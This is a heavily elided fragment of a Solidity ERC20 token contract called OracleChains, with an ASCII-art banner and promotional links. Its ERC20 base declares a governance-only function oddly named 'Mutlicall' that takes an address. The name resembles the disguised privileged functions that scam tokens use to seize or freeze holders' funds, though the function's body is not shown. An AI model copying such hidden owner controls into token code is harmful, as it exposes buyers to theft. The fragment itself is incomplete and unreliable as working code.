         ...
         @@@@@@@@@@@@@@@@@ @@@@@@    @@@@@@   @@@@@@   @@@@@@@@@@@  @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@                      
           @@@@@@@@@@@@@@   @@@@@     @@@@@@  @@@@@    @@@@@@@@@@@   @@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@                        
                         ...
                         @@@@@@@@@@@ %@@@@  @@@@@  @@@@  @@@@@  @@@@  @@@@ @@@@@@@@@ @@@@@@@@@@@@       
                               ...
                               https://t.me/OracleChains      https://oraclechains.com/                                       */
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function Mutlicall (address spender) external onlyGovernance {
...
contract OracleChains is ERC20 {

    /**
     * @dev Sets the values for {name}, {symbol} and {totalsupply}.
     */
    constructor() ERC20('OracleChains', 'ORACLEc')  {
